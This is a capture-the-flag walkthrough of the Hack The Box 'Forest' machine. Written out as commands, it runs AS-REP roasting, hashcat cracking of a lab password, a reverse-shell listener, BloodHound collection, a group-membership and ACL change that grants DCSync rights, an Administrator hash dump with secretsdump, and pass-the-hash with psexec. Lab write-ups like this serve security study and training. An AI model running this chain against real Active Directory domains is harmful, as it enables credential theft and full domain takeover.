---
Category: OSCP - TjNull
LAB: https://app.hackthebox.com/machines/Forest?sort_by=created_at&sort_type=desc
Difficulty: Easy
Featured: yes
aliases:
  - AD
---

---
# Information / Description

![](../../0.%20Assets/Forest-1791195223279.webp)
![|202|274x281](../../0.%20Assets/Forest-1791195236528.webp)
---

# Walkthrough


Let's start with the basics and run an `nmap` scan to see what the machine is exposing.

First, I'll enumerate the open ports.

```
nmap $T -sS -Pn -n -p-  --min-rate 5000 -oG openPorts.gmap
```

- `$T` is a variable I use to hold the target's IP address.

I save the results in a `grepable` format because I have a small `zsh` function called `"ExtractPorts"` that reads the file and copies the open ports straight to the clipboard. That saves me from typing them out by hand or scanning the full range again.

You can find the Kali dotfiles I put together here -> [Dotfiles](https://github.com/MarcussanMG/kali-dotfiles)

```
nmap $T -sS -Pn -n -sVC --min-rate 5000 -oN results.txt -p 53,88,135,139,389,445,464,593,636,3268,3269,5985,9389,47001,49664,49665,49666,49668,49670,49680,49681,49685,49700
```

![](../../0.%20Assets/Forest-1791195923651.webp)

I tried fingerprinting the `tcpwrapped` ports manually with `netcat`, but had no success.

```
nc -nv <port>
```

The first thing I'll do from here is identify the domain and add it to `/etc/hosts`.

```
netexec smb $T
```

![](../../0.%20Assets/Forest-1791196050451.webp)

![](../../0.%20Assets/Forest-1791196124707.webp)

A few enumeration attempts came up empty until I turned to `enum4linux`.
I used the following command to pull the users into a list.

```
enum4linux -U "$T" | grep 'user:' | cut -d '[' -f2 | cut -d ']' -f1 | sort -u | tee users.txt
```

![](../../0.%20Assets/Forest-1791198761973.webp)

With the enumerated users, I ran an `AS-REP roasting attack`.

```
impacket-GetNPUsers 'htb.local/' \                                
  -usersfile users.txt \
  -no-pass \
  -dc-ip $T \
  -format hashcat \
  -outputfile asrep-impacket.txt
```


![](../../0.%20Assets/Forest-1791198929421.webp)

This returns a hash for the user `svc-alfresco`.

Let's crack it.

```
hashcat -m 18200 asrep-impacket.txt /usr/share/wordlists/rockyou.txt
```

![](../../0.%20Assets/Forest-1791199377120.webp)


![](../../0.%20Assets/Forest-1791199580038.webp)

I checked the user's shares and didn't find anything interesting.

![](../../0.%20Assets/Forest-1791200388596.webp)


Let's see what this user can do. I'll use [nxcspray](https://github.com/NTHSec/nxcspray), a handy tool for testing every protocol at once.

```
./nxcspray all $T -u 'svc-alfresco' -p 's3rvice'
```

![](../../0.%20Assets/Forest-1791199683103.webp)

We have access to the machine through `winrm`, so let's connect with `evil-winrm`.

```
evil-winrm -i $T -u svc-alfresco -p 's3rvice'
```

I prefer `Penelope` for handling my shells, so I'll use a reverse shell payload over the `evil-winrm` connection to catch the session there instead.

```
penelope -O -p 1337 -a -i tun0
```

![](../../0.%20Assets/Forest-1791199925702.webp)

![](../../0.%20Assets/Forest-1791199985127.webp)

We have the first flag. Let's enumerate from inside the machine itself.

```
whoami /all
```

![](../../0.%20Assets/Forest-1791201109696.webp)

`Service Accounts`, `Privileged IT Accounts`, and `Account Operators` all look interesting.

We also appear to be an administrator, though not a high-level one.

I uploaded `Sharphound.ps1` and `PowerUp.ps1`.

![](../../0.%20Assets/Forest-1791200444151.webp)


I started with `PowerUp`.

```
powershell -ep bypass  
. .\PowerUp.ps1  
Invoke-AllChecks
```

![](../../0.%20Assets/Forest-1791200677551.webp)

I'll keep this in mind. Now let's collect the data for BloodHound.

`sharphound` kept breaking, so I collected the data with:

```
bloodhound-python  -u svc-alfresco -p 's3rvice' -d htb.local -ns $T -c All --zip
```

Then we import the data into `Bloodhound`.

![](../../0.%20Assets/Forest-1791202558075.webp)



![](../../0.%20Assets/Forest-1791202795596.webp)


Let's add ourselves to the group.

```
net rpc group addmem "Exchange Windows Permissions" "svc-alfresco" -U "htb.local/svc-alfresco%s3rvice" -S 10.129.95.210
```


![](../../0.%20Assets/Forest-1791203599087.webp)

Now let's grant ourselves the permissions needed for a `DCSync` attack.

```
impacket-dacledit -action write -rights DCSync -principal svc-alfresco -target-dn "DC=htb,DC=local" -dc-ip 10.129.95.210 'htb.local/svc-alfresco:s3rvice'
```

And perform the `DCSync`.

```
impacket-secretsdump -just-dc-user Administrator 'htb.local/svc-alfresco:s3rvice@10.129.95.210'
```

![](../../0.%20Assets/Forest-1791204399969.webp)

Now we can pass the hash with `PsExec`.

```
impacket-psexec hbt.local/Administrator@$T -hashes :32693b11e6aa90e....
```

![](../../0.%20Assets/Forest-1791204672258.webp)